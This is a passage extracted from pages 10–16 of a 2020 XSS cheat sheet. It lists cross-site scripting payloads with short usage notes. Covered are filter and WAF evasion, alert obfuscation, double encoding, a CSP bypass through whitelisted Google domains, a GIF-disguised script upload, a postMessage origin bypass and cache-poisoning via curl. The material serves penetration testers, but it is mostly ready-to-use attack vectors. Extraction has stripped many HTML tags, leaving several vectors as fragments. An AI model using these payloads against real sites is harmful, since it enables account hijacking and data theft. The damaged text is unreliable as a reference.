© 2020 Brute Logic – All rights reserved. 10
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
XSS in SSI
Use when there’s a Server-Side Include (SSI) injection.
>
SQLi Error-Based XSS
Use in endpoints where a SQL error message can be triggered (with a quote or backslash).
'1
\
Injection in JSP Path
Use in JSP-based applications in the path of URL.
//DOMAIN/PATH/;
//DOMAIN/PATH/;">
JS Injection - ReferenceError Fix
Use to fix the syntax of some hanging javascript code. Check console tab in Browser
Developer Tools (F12) for the respective ReferenceError and replace var and function
names accordingly.
';alert(1);var myObj='
';alert(1);function myFunc(){}'
Bootstrap Vector (up to v3.4.0)
Use when there’s a bootstrap library present on page. It also bypass Webkit Auditor, just
click anywhere in page to trigger. Any char of href value can be HTML encoded do bypass
filters.
">
Browser Notification
Use as an alternative to alert, prompt and confirm popups. It requires user acceptance (1st
payload) but once user has authorized previously for that site, the 2nd one can be used.
Notification.requestPermission(x=>{new(Notification)(1)})
new(Notification)(1)
XSS in HTTP Header - Cached
Use to store a XSS vector in application by using the MISS-MISS-HIT cache scheme (if
there’s one in place). Replace  with your respective vector and TARGET with a dummy
string to avoid the actual cached version of the page. Fire the same request 3 times.
$ curl -H "Vulnerable_Header: " TARGET/?dummy_string
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 11
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Mixed Case
Use to bypass case-sensitive filters.
Unclosed Tags
Use in HTML injections to avoid filtering based in the presence of both lower than () signs. It requires a native greater than sign in source code after input
reflection.
Extra Content for Script Tags
Use when filter looks for “” or “
Double Encoded XSS
Use when application performs double decoding of input.
%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
Alert without Parentheses (Strings Only)
Use in an HTML vector or javascript injection when parentheses are not allowed and a
simple alert box is enough.
alert`1`
Alert without Parentheses
Use in an HTML vector or javascript injection when parentheses are not allowed and PoC
requires to return any target info.
setTimeout`alert\x28document.domain\x29`
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 12
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
setInterval`alert\x28document.domain\x29`
Alert without Parentheses – HTML Entities
Use only in HTML injections when parentheses are not allowed. Replace “&” with “%26”
and “#” with “%23” in URLs.
Alert without Alphabetic Chars
Use when alphabetic characters are not allowed. Following is alert(1).
[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']
('\141\154\145\162\164\50\61\51')()
Alert Obfuscation
Use to trick several regular expression (regex) filters. It might be combined with previous
alternatives (above). The shortest option “top” can also be replaced by “window”, “parent”,
“self” or “this” depending on context.
(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)
Alert Alternative – Write & Writeln
Use as an alternative to alert, prompt and confirm. If used within a HTML vector it can be
used as it is but if it’s a JS injection the full “document.write” form is required. Replace “&”
with “%26” and “#” with “%23” in URLs. Write can be replaced by writeln.
write`XSSed!`
write`.
top.open`javas\cript:al\ert\x281\x29`
top.open`javas\cript:al\ert\x281\x29${0}0`
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 13
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Alert Alternative - Eval + URL
Use as an alternative to call alert, prompt and confirm. First payload is the primitive form
while the second replaces eval with the value of id attribute of vector used. URL must be in
one of the following ways, in URL path after PHP extension or in fragment of the URL. Plus
sign (+) must be encoded in URLs.
PoC URL must contain one of the following:
=> FILE.php/'/alert(1)//?...
=> #'/alert(1)
Alert Alternative - Eval + URL with Template Literal
${alert(1)}
HTML Injection - Inline Alternative
Use to bypass blacklists.
"onpointerover=alert(1) //
"autofocus onfocusin=alert(1) //
Strip-Tags Based Bypass
Use when filter strips out anything between a  characters like PHP’s strip_tags()
function. Inline injection only.
"onmouseover=alert(1)//
"autofocus onfocus=alert(1)//
File Upload Injection – HTML/js GIF Disguise
Use to bypass CSP via file upload. Save all content below as “xss.gif” or “xss.js” (for strict
MIME checking). It can be imported to target page with  (also
“xss.js”) or . It’s image/gif for PHP.
GIF89a=//;
Jump to URL Fragment
Use when you need to hide some characters from your payload that would trigger a WAF
for example. It makes use of respective payload format after URL fragment (#).
eval(URL.slice(-8)) #alert(1)
eval(location.hash.slice(1)) #alert(1)
document.write(decodeURI(location.hash)) #
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 14
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Second Order XSS Injection
Use when your input will be used twice, like stored normalized in a database and then
retrieved for later use or inserted into DOM.
&lt;svg/onload&equals;alert(1)&gt;
PHP Spell Checker Bypass
Use to bypass PHP’s pspell_new function which provides a dictionary to try to guess the
input used to search. A “Did You Mean” Google-like feature for search fields.
 confirm(1) 
Event Origin Bypass for postMessage() XSS
Use when a check for origin can be bypassed in javascript code of target by prepending one
of the allowed origins as a subdomain of the attacking domain that will send the payload.
Example makes use of CrossPwn script (available in Extra section) at localhost.
http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
status.html&msg=
CSP Bypass (for Whitelisted Google Domains)
Use when there’s a CSP (Content-Security Policy) that allows execution from these
domains.
{{$new.constructor('alert(1)')()}}
SVG Vectors with Event Handlers
It works on Firefox but adding attributename=x inside  makes it work in Chromium-
based too. “Set” can also be replaced by “animate”. Use against blacklists.
SVG Vectors without Event Handlers
Use to avoid filters looking for event handlers or src, data, etc. Last one is Firefox only,
already URL encoded.
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 15
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Vectors without Event Handlers
Use as an alternative to event handlers, if they are not allowed. Some require user
interaction as stated in the vector itself (also part of them).
click
click
click
click
Vectors with Agnostic Event Handlers
Use the following vectors when all known HTML tag names are not allowed. Any alphabetic
char or string can be used as tag name in place of “x”. They require user interaction as stated
by their very text content (which make part of the vectors too).
lose focus!
click this!
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 16
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
copy this!
right click this!
right click this!
copy this!
double click this!
drag this!
focus this!
input here!
press any key!
press any key!
press any key!
click this!
hover this
hover this!